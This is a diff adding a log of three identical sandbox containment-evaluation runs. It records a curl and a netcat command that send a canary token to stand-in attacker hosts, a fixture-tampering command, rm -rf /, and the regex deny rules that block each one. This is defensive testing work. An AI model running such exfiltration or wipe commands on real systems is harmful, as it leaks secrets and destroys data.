@@ -1,0 +1,57 @@
+[2026-10-23T14:25:14.297571+00:00] === Starting Containment Evaluation containment-eval-20261023-142514 for sandbox 'sbx-cfa8ab6ec314' ===
+[2026-10-23T14:25:14.299574+00:00] Initial Host Fixture SHA256: c0e3fd8d95272039bf56ecaf4b8361a08abbd38771921a8358ad3f8d8a256bc0 (tests\fixtures\host_fixture.txt)
+[2026-10-23T14:25:14.352907+00:00] Sandbox 'sbx-cfa8ab6ec314' is ready. Commencing adversarial injection suite.
+[2026-10-23T14:25:14.352907+00:00] Executing attack payload [canary_exfiltration_attack]: Attempt to exfiltrate secret canary to external untrusted HTTP endpoint
+[2026-10-23T14:25:14.354110+00:00] Raw command: curl -X POST -d 'canary=CANARY_TOKEN_SAFE_TEST_998877_SECRET' http://evil-exfil.com/leak
+[2026-10-23T14:25:14.355625+00:00] BLOCKED: Safety policy successfully vetoed command before guest dispatch. Reason: Command matches prohibited security rule pattern: \b(curl|wget|nc|ncat|netcat|socat|telnet)\b.*(evil|exfil|malicious|attacker|canary=)
+[2026-10-23T14:25:14.356641+00:00] Executing attack payload [netcat_raw_socket_leak]: Attempt to send canary token via raw socket
+[2026-10-23T14:25:14.357641+00:00] Raw command: nc -w 2 attacker.evil.com 4444 <<< 'CANARY_TOKEN_SAFE_TEST_998877_SECRET'
+[2026-10-23T14:25:14.359642+00:00] BLOCKED: Safety policy successfully vetoed command before guest dispatch. Reason: Command matches prohibited security rule pattern: \b(curl|wget|nc|ncat|netcat|socat|telnet)\b.*(evil|exfil|malicious|attacker|canary=)
+[2026-10-23T14:25:14.360162+00:00] Executing attack payload [host_fixture_tamper_attack]: Attempt to tamper with host sentinel fixture file
+[2026-10-23T14:25:14.360162+00:00] Raw command: echo 'COMPROMISED' > tests/fixtures/host_fixture.txt
+[2026-10-23T14:25:14.361179+00:00] BLOCKED: Safety policy successfully vetoed command before guest dispatch. Reason: Command matches prohibited security rule pattern: \bhost_fixture\.txt\b
+[2026-10-23T14:25:14.362187+00:00] Executing attack payload [destructive_wipe_attack]: Attempt destructive deletion inside guest
+[2026-10-23T14:25:14.362187+00:00] Raw command: rm -rf /
+[2026-10-23T14:25:14.363595+00:00] BLOCKED: Safety policy successfully vetoed command before guest dispatch. Reason: Prohibited destructive command pattern detected: 'rm -rf /'
+[2026-10-23T14:25:14.365108+00:00] Tearing down guest sandbox 'sbx-cfa8ab6ec314'...
+[2026-10-23T14:25:14.365108+00:00] Sandbox 'sbx-cfa8ab6ec314' deleted. Final state: deleted
+[2026-10-23T14:25:14.366128+00:00] Post-run Host Fixture SHA256: c0e3fd8d95272039bf56ecaf4b8361a08abbd38771921a8358ad3f8d8a256bc0 (Match: True)
+[2026-10-23T14:25:14.366128+00:00] === Containment Evaluation Completed: PASSED=True ===
+[2026-10-24T01:51:10.994768+00:00] === Starting Containment Evaluation containment-eval-20261024-015110 for sandbox 'sbx-c46740833f04' ===
+[2026-10-24T01:51:10.998307+00:00] Initial Host Fixture SHA256: c0e3fd8d95272039bf56ecaf4b8361a08abbd38771921a8358ad3f8d8a256bc0 (tests\fixtures\host_fixture.txt)
+[2026-10-24T01:51:11.068360+00:00] Sandbox 'sbx-c46740833f04' is ready. Commencing adversarial injection suite.
+[2026-10-24T01:51:11.068971+00:00] Executing attack payload [canary_exfiltration_attack]: Attempt to exfiltrate secret canary to external untrusted HTTP endpoint
+[2026-10-24T01:51:11.068971+00:00] Raw command: curl -X POST -d 'canary=CANARY_TOKEN_SAFE_TEST_998877_SECRET' http://evil-exfil.com/leak
+[2026-10-24T01:51:11.070994+00:00] BLOCKED: Safety policy successfully vetoed command before guest dispatch. Reason: Command matches prohibited security rule pattern: \b(curl|wget|nc|ncat|netcat|socat|telnet)\b.*(evil|exfil|malicious|attacker|canary=)
+[2026-10-24T01:51:11.071760+00:00] Executing attack payload [netcat_raw_socket_leak]: Attempt to send canary token via raw socket
+[2026-10-24T01:51:11.072579+00:00] Raw command: nc -w 2 attacker.evil.com 4444 <<< 'CANARY_TOKEN_SAFE_TEST_998877_SECRET'
+[2026-10-24T01:51:11.075172+00:00] BLOCKED: Safety policy successfully vetoed command before guest dispatch. Reason: Command matches prohibited security rule pattern: \b(curl|wget|nc|ncat|netcat|socat|telnet)\b.*(evil|exfil|malicious|attacker|canary=)
+[2026-10-24T01:51:11.078517+00:00] Executing attack payload [host_fixture_tamper_attack]: Attempt to tamper with host sentinel fixture file
+[2026-10-24T01:51:11.081425+00:00] Raw command: echo 'COMPROMISED' > tests/fixtures/host_fixture.txt
+[2026-10-24T01:51:11.086160+00:00] BLOCKED: Safety policy successfully vetoed command before guest dispatch. Reason: Command matches prohibited security rule pattern: \bhost_fixture\.txt\b
+[2026-10-24T01:51:11.088255+00:00] Executing attack payload [destructive_wipe_attack]: Attempt destructive deletion inside guest
+[2026-10-24T01:51:11.089033+00:00] Raw command: rm -rf /
+[2026-10-24T01:51:11.090479+00:00] BLOCKED: Safety policy successfully vetoed command before guest dispatch. Reason: Prohibited destructive command pattern detected: 'rm -rf /'
+[2026-10-24T01:51:11.091043+00:00] Tearing down guest sandbox 'sbx-c46740833f04'...
+[2026-10-24T01:51:11.104497+00:00] Sandbox 'sbx-c46740833f04' deleted. Final state: deleted
+[2026-10-24T01:51:11.106652+00:00] Post-run Host Fixture SHA256: c0e3fd8d95272039bf56ecaf4b8361a08abbd38771921a8358ad3f8d8a256bc0 (Match: True)
+[2026-10-24T01:51:11.107230+00:00] === Containment Evaluation Completed: PASSED=True ===
+[2026-10-24T01:53:25.589616+00:00] === Starting Containment Evaluation containment-eval-20261024-015325 for sandbox 'sbx-14233c08f966' ===
+[2026-10-24T01:53:25.602205+00:00] Initial Host Fixture SHA256: c0e3fd8d95272039bf56ecaf4b8361a08abbd38771921a8358ad3f8d8a256bc0 (tests\fixtures\host_fixture.txt)
+[2026-10-24T01:53:25.660543+00:00] Sandbox 'sbx-14233c08f966' is ready. Commencing adversarial injection suite.
+[2026-10-24T01:53:25.661465+00:00] Executing attack payload [canary_exfiltration_attack]: Attempt to exfiltrate secret canary to external untrusted HTTP endpoint
+[2026-10-24T01:53:25.661465+00:00] Raw command: curl -X POST -d 'canary=CANARY_TOKEN_SAFE_TEST_998877_SECRET' http://evil-exfil.com/leak
+[2026-10-24T01:53:25.662480+00:00] BLOCKED: Safety policy successfully vetoed command before guest dispatch. Reason: Command matches prohibited security rule pattern: \b(curl|wget|nc|ncat|netcat|socat|telnet)\b.*(evil|exfil|malicious|attacker|canary=)
+[2026-10-24T01:53:25.663478+00:00] Executing attack payload [netcat_raw_socket_leak]: Attempt to send canary token via raw socket
+[2026-10-24T01:53:25.664478+00:00] Raw command: nc -w 2 attacker.evil.com 4444 <<< 'CANARY_TOKEN_SAFE_TEST_998877_SECRET'
+[2026-10-24T01:53:25.665998+00:00] BLOCKED: Safety policy successfully vetoed command before guest dispatch. Reason: Command matches prohibited security rule pattern: \b(curl|wget|nc|ncat|netcat|socat|telnet)\b.*(evil|exfil|malicious|attacker|canary=)
+[2026-10-24T01:53:25.665998+00:00] Executing attack payload [host_fixture_tamper_attack]: Attempt to tamper with host sentinel fixture file
+[2026-10-24T01:53:25.667010+00:00] Raw command: echo 'COMPROMISED' > tests/fixtures/host_fixture.txt
+[2026-10-24T01:53:25.668009+00:00] BLOCKED: Safety policy successfully vetoed command before guest dispatch. Reason: Command matches prohibited security rule pattern: \bhost_fixture\.txt\b
+[2026-10-24T01:53:25.669009+00:00] Executing attack payload [destructive_wipe_attack]: Attempt destructive deletion inside guest
+[2026-10-24T01:53:25.669009+00:00] Raw command: rm -rf /
+[2026-10-24T01:53:25.671058+00:00] BLOCKED: Safety policy successfully vetoed command before guest dispatch. Reason: Prohibited destructive command pattern detected: 'rm -rf /'
+[2026-10-24T01:53:25.671058+00:00] Tearing down guest sandbox 'sbx-14233c08f966'...
+[2026-10-24T01:53:25.671058+00:00] Sandbox 'sbx-14233c08f966' deleted. Final state: deleted
+[2026-10-24T01:53:25.672518+00:00] Post-run Host Fixture SHA256: c0e3fd8d95272039bf56ecaf4b8361a08abbd38771921a8358ad3f8d8a256bc0 (Match: True)
+[2026-10-24T01:53:25.673518+00:00] === Containment Evaluation Completed: PASSED=True ===
